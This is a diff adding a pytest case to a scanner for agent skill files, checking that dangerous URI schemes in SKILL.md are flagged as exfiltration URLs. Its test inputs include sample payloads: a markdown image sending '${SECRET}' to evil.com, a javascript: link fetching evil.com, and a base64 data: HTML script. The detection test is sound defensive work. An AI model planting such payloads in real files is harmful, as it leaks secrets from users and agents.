@@ -193,3 +193,20 @@ def test_hardcoded_secrets_detected(scanner, tmp_skill, secret, desc):
     report = scanner.scan_path(tmp_skill.base)
     cred_findings = [f for f in report["findings"] if f["category"] == "hardcoded_secret"]
     assert len(cred_findings) >= 1, f"Hardcoded {desc} not detected"
+
+
+# --- Task 2.5: Dangerous URI schemes (H5) ---
+
+
+@pytest.mark.parametrize("payload", [
+    '![img](data:text/html;base64,PHNjcmlwdD4=)',
+    '![img](//evil.com/exfil?data=${SECRET})',
+    '<a href="javascript:fetch(\'//evil.com\')">click</a>',
+])
+def test_dangerous_uri_schemes_detected(scanner, tmp_skill, payload):
+    """data:, javascript:, and protocol-relative URIs must be detected."""
+    tmp_skill.add_file("SKILL.md", payload)
+    report = scanner.scan_path(tmp_skill.base)
+    assert any(
+        f["category"] == "exfiltration_url" for f in report["findings"]
+    ), f"URI not detected: {payload[:60]}"
